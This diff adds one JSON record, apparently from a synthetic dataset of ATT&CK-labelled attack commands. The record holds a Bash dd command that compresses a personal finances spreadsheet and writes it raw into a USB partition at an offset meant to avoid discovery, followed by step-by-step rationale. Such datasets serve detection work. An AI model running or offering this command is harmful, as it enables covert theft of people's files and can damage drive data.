@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1052",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "gzip -c \"$HOME/Documents/finances.xlsx\" | dd of=\"/dev/disk/by-id/usb-Generic_Flash_Disk_8GB-0:0-part1\" bs=1M seek=1 conv=notrunc,fsync status=none",
+  "explanation": "Compresses a single sensitive file and writes it starting 1 MiB into the USB partition to avoid the partition header area and reduce casual discovery.",
+  "rationale_steps": [
+    "Compress the target file into a stream to reduce size",
+    "Select a partition device path for the USB",
+    "Use dd with a 1 MiB seek offset and notrunc to embed data past the initial sectors"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-4585860b-a9745670",
+  "source_prompt_hash": "4585860b",
+  "timestamp_utc": "2025-09-30T05:09:05.177002Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
